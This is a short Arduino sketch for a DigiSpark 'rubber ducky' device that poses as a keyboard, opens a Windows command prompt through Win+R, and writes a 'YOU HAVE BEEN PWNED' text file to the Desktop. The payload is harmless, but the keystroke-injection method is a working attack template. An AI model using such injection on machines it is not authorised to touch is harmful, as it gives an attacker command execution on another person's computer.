//This DigiSpark script creates a text file on desktop with pwned message - based on https://maker.pro/arduino/projects/how-to-build-a-rubber-ducky-usb-with-arduino-using-a-digispark-module
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("cmd /k cd %UserProfile%/Desktop");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("echo YOU HAVE BEEN PWNED > YOU_HAVE_BEEN_PWNED.TXT");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 for (;;) {
 /*empty*/
}
}
